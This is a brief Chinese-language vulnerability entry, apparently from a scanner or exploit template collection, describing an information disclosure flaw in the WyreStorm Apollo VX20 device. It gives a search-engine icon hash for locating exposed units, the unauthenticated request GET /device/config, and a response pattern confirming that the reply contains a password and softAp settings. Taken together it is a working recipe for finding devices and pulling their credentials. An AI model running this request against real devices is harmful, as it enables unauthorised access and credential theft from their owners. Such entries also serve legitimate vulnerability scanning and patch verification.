# WyreStormApolloVX20信息泄露漏洞

WyreStormApolloVX20 ｜ 信息泄露 ｜ —
- **指纹**：`icon_hash="-893957814"`
- **请求**：`GET /device/config HTTP/1.1`
- **响应特征**：200 ^(?=.*?password)(?=.*?softAp).*?$